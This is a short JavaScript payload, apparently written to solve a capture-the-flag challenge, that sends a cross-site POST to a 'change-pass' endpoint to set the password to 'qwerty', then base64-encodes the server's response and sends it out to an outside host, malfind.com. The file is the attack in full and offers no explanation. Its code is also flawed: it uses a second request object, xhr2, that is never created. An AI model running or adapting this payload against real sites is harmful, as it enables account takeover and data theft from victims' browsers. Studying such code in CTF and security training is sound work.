var xhr = new XMLHttpRequest();
var url = "http://muffin-hater.wpi-ctf-2022-codelab.kctf.cloud:8000/change-pass";
var url2 = "https://malfind.com/exploit="
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        exf = btoa(xhr.responseText);
        xhr2.open("GET", url2+exf, true);
        xhr2.send();
        console.log(url+exf);
    }
};
var data = JSON.stringify({"newpass": "qwerty"});
xhr.send(data);